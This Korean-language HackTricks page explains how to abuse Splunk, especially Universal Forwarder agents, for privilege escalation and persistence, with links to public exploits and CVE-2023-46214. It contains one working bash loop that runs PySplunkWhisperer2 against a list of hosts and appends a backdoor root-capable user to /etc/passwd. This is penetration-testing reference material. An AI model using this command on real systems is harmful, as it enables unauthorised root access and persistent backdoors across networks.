# Splunk LPE 및 지속성

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks swag**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**telegram 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

**내부** 또는 **외부**에서 **기계를 열거**하는 경우 (포트 8090에서) **Splunk가 실행 중**인 경우, 행운이 좋다면 **유효한 자격 증명**을 알고 있다면 Splunk 서비스를 **남용**하여 Splunk를 실행하는 사용자로 **쉘을 실행**할 수 있습니다. root가 실행 중인 경우 권한을 root로 승격할 수 있습니다.

또한 이미 root이고 Splunk 서비스가 localhost만 수신하지 않는 경우 Splunk 서비스에서 **비밀번호** 파일을 **훔칠** 수 있으며 비밀번호를 **해독**하거나 새 자격 증명을 추가할 수 있습니다. 그리고 호스트에 지속성을 유지할 수 있습니다.

첫 번째 이미지에서는 Splunkd 웹 페이지가 어떻게 보이는지 볼 수 있습니다.



## Splunk Universal Forwarder Agent Exploit 요약

자세한 내용은 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)에서 확인하세요. 이것은 요약입니다:

**Exploit 개요:**
Splunk Universal Forwarder Agent (UF)를 대상으로 하는 Exploit은 에이전트 암호를 가진 공격자가 에이전트를 실행 중인 시스템에서 임의의 코드를 실행할 수 있으며, 전체 네트워크를 침해할 수 있습니다.

**주요 포인트:**
- UF 에이전트는 수신 연결 또는 코드의 신뢰성을 검증하지 않으므로 무단 코드 실행에 취약합니다.
- 일반적인 암호 획득 방법에는 네트워크 디렉터리, 파일 공유 또는 내부 문서에서 찾는 것이 포함됩니다.
- 성공적인 악용은 감염된 호스트에서 SYSTEM 또는 root 수준의 액세스, 데이터 유출 및 추가적인 네트워크 침투로 이어질 수 있습니다.

**Exploit 실행:**
1. 공격자가 UF 에이전트 암호를 획득합니다.
2. Splunk API를 사용하여 에이전트에 명령 또는 스크립트를 전송합니다.
3. 파일 추출, 사용자 계정 조작 및 시스템 침투와 같은 가능한 작업이 포함됩니다.

**영향:**
- 각 호스트에서 SYSTEM/root 수준 권한으로 전체 네트워크 침투.
- 탐지를 피하기 위해 로깅 비활성화 가능성.
- 백도어 또는 랜섬웨어 설치.

**악용을 위한 예시 명령어:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**사용 가능한 공개 익스플로잇:**
* [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
* [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
* [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)


## Splunk 쿼리 남용

**자세한 내용은 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)에서 확인하십시오.**

**CVE-2023-46214**는 임의의 스크립트를 **`$SPLUNK_HOME/bin/scripts`**에 업로드할 수 있게 했으며, 그 후 **`|runshellscript script_name.sh`** 검색 쿼리를 사용하여 해당 위치에 저장된 **스크립트**를 **실행**할 수 있었습니다.


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
